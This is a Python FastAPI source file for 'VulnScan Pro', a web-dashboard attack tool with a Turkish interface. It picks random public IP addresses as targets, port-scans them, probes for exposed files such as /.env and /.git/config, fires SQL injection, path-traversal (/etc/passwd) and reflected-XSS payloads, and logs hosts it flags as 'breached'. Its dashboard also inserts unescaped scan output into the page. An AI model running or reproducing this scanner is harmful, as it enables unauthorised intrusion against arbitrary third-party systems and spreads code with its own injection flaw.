from fastapi import FastAPI, WebSocket, WebSocketDisconnect, BackgroundTasks, Request
from fastapi.responses import HTMLResponse
from pydantic import BaseModel
import asyncio
import aiohttp
import sqlite3
import urllib.parse
import os
import logging
import time
import random
import socket
from typing import List
import uvicorn

# --- SİSTEM LOGLAMA AYARLARI ---
logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s')
logger = logging.getLogger("VulnScan")

app = FastAPI(title="VulnScan Pro - Advanced Engine")

# --- VERİTABANI VE DİZİN AYARLARI ---
DATA_DIR = os.environ.get("DATA_DIR", "/var/data")
if not os.path.exists(DATA_DIR):
    try:
        os.makedirs(DATA_DIR)
    except Exception:
        DATA_DIR = "."

DB_PATH = os.path.join(DATA_DIR, "vulnscan.db")

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.execute('PRAGMA journal_mode=WAL;')
    conn.execute('PRAGMA busy_timeout=5000;')
    return conn

def init_db():
    with get_db() as conn:
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS findings 
                     (id INTEGER PRIMARY KEY, target_url TEXT, vuln_type TEXT, 
                      payload TEXT, extracted_data TEXT, timestamp TIMESTAMP)''')
        conn.commit()

init_db()

# --- WEBSOCKET YÖNETİMİ ---
class ConnectionManager:
    def __init__(self):
        self.active_connections: List[WebSocket] = []

    async def connect(self, websocket: WebSocket):
        await websocket.accept()
        self.active_connections.append(websocket)

    def disconnect(self, websocket: WebSocket):
        if websocket in self.active_connections:
            self.active_connections.remove(websocket)

    async def broadcast(self, message: dict):
        for connection in self.active_connections:
            try:
                await connection.send_json(message)
            except:
                pass

manager = ConnectionManager()

class WSHandler(logging.Handler):
    def emit(self, record):
        log_entry = {
            "type": "log",
            "time": self.format(record).split('|')[0].strip(),
            "level": record.levelname,
            "message": self.format(record).split('|')[-1].strip()
        }
        try:
            loop = asyncio.get_running_loop()
            asyncio.run_coroutine_threadsafe(manager.broadcast(log_entry), loop)
        except RuntimeError:
            pass

ws_handler = WSHandler()
ws_handler.setFormatter(logging.Formatter('%(asctime)s | %(message)s', datefmt='%H:%M:%S'))
logger.addHandler(ws_handler)

# --- ZAFİYET LİSTELERİ ---
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
}

COMMON_DIRS = ["/admin", "/.env", "/backup.zip", "/config.php", "/phpinfo.php", "/.git/config"]
SQLI_PAYLOADS = ["'", "' OR 1=1 --"]
SQL_ERRORS = ["you have an error in your sql syntax", "unclosed quotation mark"]
LFI_PAYLOADS = ["../../../../etc/passwd"]
XSS_PAYLOADS = ["<script>alert(1)</script>", "\"><svg/onload=alert(1)>"]
COMMON_PORTS = [21, 22, 80, 443, 3306, 8080, 8443]

# --- ASENKRON VERİTABANI KAYDI ---
async def save_finding(url, vuln, payload, data):
    def db_insert():
        with get_db() as conn:
            c = conn.cursor()
            c.execute('''INSERT INTO findings (target_url, vuln_type, payload, extracted_data, timestamp) 
                         VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)''', (url, vuln, payload, data))
            conn.commit()
    await asyncio.to_thread(db_insert)

# --- TARAMA MODÜLLERİ ---
async def scan_ports(ip, results):
    for port in COMMON_PORTS:
        try:
            fut = asyncio.open_connection(ip, port)
            reader, writer = await asyncio.wait_for(fut, timeout=2)
            writer.close()
            await writer.wait_closed()
            results.append({"type": "Port", "detail": f"Açık Port: {port}"})
        except:
            pass

async def scan_and_exploit(session, target_url, config):
    report = {"target": target_url, "vulns": [], "status": "OK", "waf": False}
    
    try:
        async with session.get(target_url, timeout=8, ssl=False, allow_redirects=True, headers=HEADERS) as response:
            if response.status not in [200, 301, 302]:
                report["status"] = f"HTTP {response.status}"
                await manager.broadcast({"type": "scan_result", "data": report})
                return

            # WAF Tespiti
            headers = response.headers
            if "cloudflare" in headers.get("Server", "").lower() or "cf-ray" in headers:
                report["waf"] = True

            parsed_url = urllib.parse.urlparse(target_url)
            ip = parsed_url.hostname

            # Port Taraması
            if config.get("ports"):
                await scan_ports(ip, report["vulns"])

            # Dizin Taraması
            if config.get("dirs"):
                for path in COMMON_DIRS:
                    test_url = f"{target_url.rstrip('/')}{path}"
                    try:
                        async with session.get(test_url, timeout=3, ssl=False, headers=HEADERS) as res:
                            if res.status == 200:
                                report["vulns"].append({"type": "Dizin", "payload": path, "evidence": "HTTP 200 OK"})
                    except: pass

            # SQLi
            if config.get("sqli"):
                for payload in SQLI_PAYLOADS:
                    test_url = f"{target_url.rstrip('/')}/?id={urllib.parse.quote(payload)}"
                    try:
                        async with session.get(test_url, timeout=5, ssl=False, headers=HEADERS) as res:
                            text = (await res.text()).lower()
                            for error in SQL_ERRORS:
                                if error in text:
                                    report["vulns"].append({"type": "SQLi", "payload": payload, "evidence": error})
                                    await save_finding(target_url, "SQLi", payload, error)
                                    break
                    except: pass

            # LFI
            if config.get("lfi"):
                for payload in LFI_PAYLOADS:
                    test_url = f"{target_url.rstrip('/')}/?file={urllib.parse.quote(payload)}"
                    try:
                        async with session.get(test_url, timeout=5, ssl=False, headers=HEADERS) as res:
                            text = await res.text()
                            if "root:x:0:0" in text:
                                report["vulns"].append({"type": "LFI", "payload": payload, "evidence": "Sistem dosyası okundu"})
                                await save_finding(target_url, "LFI", payload, "System File Read")
                                break
                    except: pass

            # XSS
            if config.get("xss"):
                for payload in XSS_PAYLOADS:
                    test_url = f"{target_url.rstrip('/')}/?q={urllib.parse.quote(payload)}"
                    try:
                        async with session.get(test_url, timeout=5, ssl=False, headers=HEADERS) as res:
                            text = await res.text()
                            if payload in text:
                                report["vulns"].append({"type": "XSS", "payload": payload, "evidence": "Reflected XSS"})
                                await save_finding(target_url, "XSS", payload, "Reflected")
                                break
                    except: pass

    except Exception:
        report["status"] = "ERROR"
        
    if report["vulns"]:
        report["status"] = "SIZILDI"
        
    await manager.broadcast({"type": "scan_result", "data": report})

# --- ARKA PLAN PİPELINE ---
async def run_scan_pipeline(config: dict):
    limit = config.get("limit", 50)
    threads = config.get("threads", 50)
    
    logger.info(f"Tarama Başlatıldı. Limit: {limit} | Threads: {threads}")
    
    # Hedefleri topla (Basit OSINT simülasyonu)
    targets = set()
    while len(targets) < limit:
        ip = f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
        targets.add(f"http://{ip}")
        targets.add(f"http://testphp.vulnweb.com") # Test hedefi
    
    targets = list(targets)[:limit]
    
    connector = aiohttp.TCPConnector(limit=threads, limit_per_host=5, ssl=False)
    timeout = aiohttp.ClientTimeout(total=10)
    
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        semaphore = asyncio.Semaphore(threads)
        async def limited_scan(url):
            async with semaphore:
                await scan_and_exploit(session, url, config)

        tasks = [limited_scan(url) for url in targets]
        await asyncio.gather(*tasks)
        
    logger.info("Tarama Tamamlandı.")

# --- API ENDPOINT'LERİ ---
class ScanConfig(BaseModel):
    limit: int
    threads: int
    ports: bool
    dirs: bool
    sqli: bool
    lfi: bool
    xss: bool

@app.post("/api/scan")
async def start_scan(config: ScanConfig, background_tasks: BackgroundTasks):
    background_tasks.add_task(run_scan_pipeline, config.dict())
    return {"status": "started"}

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await manager.connect(websocket)
    try:
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        manager.disconnect(websocket)

@app.get("/", response_class=HTMLResponse)
def read_root():
    return """
    <!DOCTYPE html>
    <html lang="tr">
    <head>
        <meta charset="UTF-8">
        <title>VulnScan Pro | Advanced OSINT</title>
        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
        <style>
            :root {
                --bg: #090a0f; --panel: #12141c; --border: #1f2330;
                --text: #e2e8f0; --accent: #6366f1; --danger: #ef4444;
                --warning: #f59e0b; --success: #10b981;
            }
            * { box-sizing: border-box; margin: 0; padding: 0; }
            body { background-color: var(--bg); color: var(--text); font-family: 'Inter', sans-serif; height: 100vh; display: flex; overflow: hidden; }
            
            /* Sidebar (Sol Panel) */
            .sidebar { width: 320px; background: var(--panel); border-right: 1px solid var(--border); display: flex; flex-direction: column; }
            .brand { padding: 20px; border-bottom: 1px solid var(--border); }
            .brand h1 { font-size: 1.2rem; font-weight: 800; color: #fff; }
            .brand p { font-size: 0.75rem; color: var(--accent); font-weight: 600; letter-spacing: 1px; }
            
            .settings { padding: 20px; flex: 1; overflow-y: auto; display: flex; flex-direction: column; gap: 15px; }
            .setting-group { display: flex; flex-direction: column; gap: 5px; }
            .setting-group label { font-size: 0.8rem; color: #94a3b8; font-weight: 600; }
            .setting-group input[type="number"] { background: var(--bg); border: 1px solid var(--border); color: #fff; padding: 8px; border-radius: 4px; font-family: 'JetBrains Mono', monospace; }
            
            .checkbox-group { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 5px; }
            .checkbox-group label { display: flex; align-items: center; gap: 8px; font-size: 0.85rem; color: var(--text); cursor: pointer; background: var(--bg); padding: 8px; border: 1px solid var(--border); border-radius: 4px; }
            .checkbox-group input { accent-color: var(--accent); }
            
            .btn-start { background: var(--accent); color: #fff; border: none; padding: 15px; border-radius: 6px; font-weight: 800; font-size: 1rem; cursor: pointer; transition: 0.2s; margin-top: 10px; }
            .btn-start:hover { background: #4f46e5; }
            .btn-start:disabled { background: #334155; cursor: not-allowed; }

            /* Main Content (Sağ Panel) */
            .main-content { flex: 1; display: flex; flex-direction: column; }
            
            /* Stats Bar */
            .stats-bar { display: flex; background: var(--panel); border-bottom: 1px solid var(--border); padding: 15px 25px; gap: 30px; }
            .stat-item { display: flex; flex-direction: column; }
            .stat-label { font-size: 0.75rem; color: #94a3b8; text-transform: uppercase; }
            .stat-value { font-size: 1.4rem; font-family: 'JetBrains Mono', monospace; font-weight: 700; }
            .stat-value.scanned { color: var(--accent); }
            .stat-value.vuln { color: var(--danger); }
            .stat-value.clean { color: var(--success); }
            .stat-value.error { color: var(--warning); }

            /* Content Layout */
            .content-layout { display: flex; flex: 1; overflow: hidden; }
            
            /* Terminal (Loglar) */
            .terminal-panel { width: 35%; background: #000; border-right: 1px solid var(--border); display: flex; flex-direction: column; }
            .panel-header { padding: 10px 15px; background: var(--panel); border-bottom: 1px solid var(--border); font-size: 0.8rem; color: #94a3b8; font-weight: 600; text-transform: uppercase; display: flex; justify-content: space-between; }
            .terminal { flex: 1; overflow-y: auto; padding: 15px; font-family: 'JetBrains Mono', monospace; font-size: 0.8rem; line-height: 1.6; }
            .log-line { margin-bottom: 4px; word-wrap: break-word; }
            .log-time { color: #475569; }
            .log-info { color: var(--accent); }
            .log-warning { color: var(--warning); }
            .log-critical { color: var(--danger); font-weight: bold; }

            /* Results Table */
            .table-panel { width: 65%; display: flex; flex-direction: column; background: var(--bg); }
            .table-container { flex: 1; overflow-y: auto; padding: 15px; }
            table { width: 100%; border-collapse: collapse; }
            th, td { padding: 12px 15px; text-align: left; border-bottom: 1px solid var(--border); font-size: 0.9rem; }
            th { background: var(--panel); color: #94a3b8; font-weight: 600; position: sticky; top: 0; z-index: 10; }
            tr:hover { background: #1e2230; }
            
            .badge { padding: 4px 8px; border-radius: 4px; font-size: 0.75rem; font-weight: 600; }
            .badge-vuln { background: rgba(239, 68, 68, 0.15); color: var(--danger); border: 1px solid rgba(239, 68, 68, 0.3); }
            .badge-clean { background: rgba(16, 185, 129, 0.15); color: var(--success); border: 1px solid rgba(16, 185, 129, 0.3); }
            .badge-err { background: rgba(245, 158, 11, 0.15); color: var(--warning); border: 1px solid rgba(245, 158, 11, 0.3); }
            .badge-waf { background: rgba(139, 92, 246, 0.15); color: #a78bfa; border: 1px solid rgba(139, 92, 246, 0.3); margin-left: 5px; }
            
            .vuln-detail { font-family: 'JetBrains Mono', monospace; font-size: 0.75rem; color: #fca5a5; display: block; margin-top: 4px; }
            .vuln-detail span { color: #fff; }
        </style>
    </head>
    <body>
        <div class="sidebar">
            <div class="brand">
                <h1>VulnScan Pro</h1>
                <p>ADVANCED ENGINE v2.0</p>
            </div>
            <div class="settings">
                <div class="setting-group">
                    <label>Hedef Limiti (Max 1000)</label>
                    <input type="number" id="limit" value="100" min="10" max="1000">
                </div>
                <div class="setting-group">
                    <label>Eşzamanlı İstek (Thread)</label>
                    <input type="number" id="threads" value="50" min="10" max="200">
                </div>
                
                <div class="setting-group" style="margin-top: 10px;">
                    <label>Tarama Modülleri</label>
                    <div class="checkbox-group">
                        <label><input type="checkbox" id="mod-ports" checked> Port Tarama</label>
                        <label><input type="checkbox" id="mod-dirs" checked> Dizin Keşfi</label>
                        <label><input type="checkbox" id="mod-sqli" checked> SQL Injection</label>
                        <label><input type="checkbox" id="mod-lfi" checked> LFI</label>
                        <label><input type="checkbox" id="mod-xss" checked> XSS</label>
                    </div>
                </div>

                <button class="btn-start" id="startBtn" onclick="startScan()">TARAMAYI BAŞLAT</button>
            </div>
        </div>

        <div class="main-content">
            <div class="stats-bar">
                <div class="stat-item">
                    <span class="stat-label">Taranan</span>
                    <span class="stat-value scanned" id="stat-scanned">0</span>
                </div>
                <div class="stat-item">
                    <span class="stat-label">Sızılan</span>
                    <span class="stat-value vuln" id="stat-vuln">0</span>
                </div>
                <div class="stat-item">
                    <span class="stat-label">Temiz</span>
                    <span class="stat-value clean" id="stat-clean">0</span>
                </div>
                <div class="stat-item">
                    <span class="stat-label">Hata</span>
                    <span class="stat-value error" id="stat-error">0</span>
                </div>
            </div>

            <div class="content-layout">
                <div class="terminal-panel">
                    <div class="panel-header">Konsol Çıktısı</div>
                    <div id="terminal" class="terminal"></div>
                </div>
                
                <div class="table-panel">
                    <div class="panel-header">Tarama Sonuçları</div>
                    <div class="table-container">
                        <table id="resultsTable">
                            <thead>
                                <tr>
                                    <th>Hedef URL</th>
                                    <th>Durum</th>
                                    <th>Detaylar</th>
                                </tr>
                            </thead>
                            <tbody id="tableBody">
                                <!-- Sonuçlar buraya gelecek -->
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>
        </div>

        <script>
            const protocol = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
            const ws = new WebSocket(protocol + window.location.host + "/ws");
            const terminal = document.getElementById('terminal');
            const tableBody = document.getElementById('tableBody');
            
            let stats = { scanned: 0, vuln: 0, clean: 0, error: 0 };

            ws.onmessage = function(event) {
                const data = JSON.parse(event.data);
                
                if (data.type === "log") {
                    const line = document.createElement("div");
                    line.className = "log-line";
                    let colorClass = "log-info";
                    if (data.level === "WARNING") colorClass = "log-warning";
                    if (data.level === "CRITICAL" || data.level === "ERROR") colorClass = "log-critical";

                    line.innerHTML = `<span class="log-time">[${data.time}]</span> <span class="${colorClass}">${data.message}</span>`;
                    terminal.appendChild(line);
                    terminal.scrollTop = terminal.scrollHeight;
                } 
                else if (data.type === "scan_result") {
                    stats.scanned++;
                    
                    const res = data.data;
                    let statusBadge = "";
                    let detailHtml = "";
                    
                    if (res.status === "SIZILDI") {
                        stats.vuln++;
                        statusBadge = `<span class="badge badge-vuln">SIZILDI</span>`;
                        res.vulns.forEach(v => {
                            detailHtml += `<span class="vuln-detail">> <span>${v.type}</span>: ${v.payload || v.detail} (${v.evidence})</span>`;
                        });
                    } else if (res.status === "ERROR" || res.status.startsWith("HTTP")) {
                        stats.error++;
                        statusBadge = `<span class="badge badge-err">${res.status}</span>`;
                        detailHtml = `<span style="color:#64748b; font-size:0.8rem;">Erişilemedi veya yanıt vermedi.</span>`;
                    } else {
                        stats.clean++;
                        statusBadge = `<span class="badge badge-clean">TEMİZ</span>`;
                        detailHtml = `<span style="color:#64748b; font-size:0.8rem;">Zafiyet bulunamadı.</span>`;
                    }

                    if (res.waf) {
                        statusBadge += `<span class="badge badge-waf">WAF VAR</span>`;
                    }

                    document.getElementById('stat-scanned').innerText = stats.scanned;
                    document.getElementById('stat-vuln').innerText = stats.vuln;
                    document.getElementById('stat-clean').innerText = stats.clean;
                    document.getElementById('stat-error').innerText = stats.error;

                    const tr = document.createElement("tr");
                    tr.innerHTML = `
                        <td style="font-family:'JetBrains Mono', monospace; word-break:break-all;">${res.target}</td>
                        <td>${statusBadge}</td>
                        <td>${detailHtml}</td>
                    `;
                    
                    tableBody.insertBefore(tr, tableBody.firstChild);
                }
            };

            async function startScan() {
                const btn = document.getElementById('startBtn');
                btn.disabled = true;
                btn.innerText = "TARANIYOR...";
                
                terminal.innerHTML = "";
                tableBody.innerHTML = "";
                stats = { scanned: 0, vuln: 0, clean: 0, error: 0 };
                document.getElementById('stat-scanned').innerText = 0;
                document.getElementById('stat-vuln').innerText = 0;
                document.getElementById('stat-clean').innerText = 0;
                document.getElementById('stat-error').innerText = 0;

                const config = {
                    limit: parseInt(document.getElementById('limit').value),
                    threads: parseInt(document.getElementById('threads').value),
                    ports: document.getElementById('mod-ports').checked,
                    dirs: document.getElementById('mod-dirs').checked,
                    sqli: document.getElementById('mod-sqli').checked,
                    lfi: document.getElementById('mod-lfi').checked,
                    xss: document.getElementById('mod-xss').checked
                };

                try {
                    await fetch('/api/scan', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(config)
                    });
                } catch (error) {
                    console.error("API Hatası:", error);
                } finally {
                    btn.disabled = false;
                    btn.innerText = "TARAMAYI BAŞLAT";
                }
            }
        </script>
    </body>
    </html>
    """

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)
